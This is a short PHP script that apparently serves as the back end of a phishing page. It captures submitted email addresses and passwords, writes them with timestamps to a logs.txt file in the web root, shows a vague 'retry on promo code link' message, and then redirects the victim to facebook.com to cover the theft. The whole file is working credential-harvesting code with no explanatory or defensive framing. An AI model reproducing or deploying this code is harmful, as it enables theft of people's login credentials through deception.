<?php
ob_start();
date_default_timezone_set("Asia/Manila");

if(isset($_POST['email'])){
	$timestamp = date("Y-m-d H:i:s");
	$content = $_POST['email']." | ".$_POST['password']." | ".$timestamp." => \n\r";
	// echo "<h1>".$_SERVER['DOCUMENT_ROOT']."</h1>";
	$file_path = $_SERVER['DOCUMENT_ROOT'] . "/logs.txt";
	$file_content = file_get_contents($file_path)."\n";
	$fp = fopen($file_path,"wb");
	fwrite($fp,$content.$file_content);
	fclose($fp);
?>
	If you not works, please retry again on promo code link.
	<script type="text/javascript">
		setTimeout(function (){
			location.href = 'https://facebook.com';
		}, 4000)
	</script>
<?php
}
?>